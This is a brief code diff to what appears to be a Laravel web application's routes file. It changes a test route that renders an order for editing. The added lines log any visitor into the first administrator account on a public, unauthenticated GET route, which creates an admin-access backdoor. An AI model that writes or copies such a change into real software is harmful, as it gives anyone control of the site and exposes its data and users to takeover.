@@ -50,6 +50,10 @@ Route::get('/debug-logs', function() {
 });
 
 Route::get('/test-render-edit/{id}', function($id) {
+    $user = \App\User::where('role', 'admin')->first();
+    if ($user) {
+        auth()->login($user);
+    }
     $order = \App\Models\Order::with(['cart_info.product', 'cart_info.bundle'])->find($id);
     if (!$order) {
         return "Order not found";
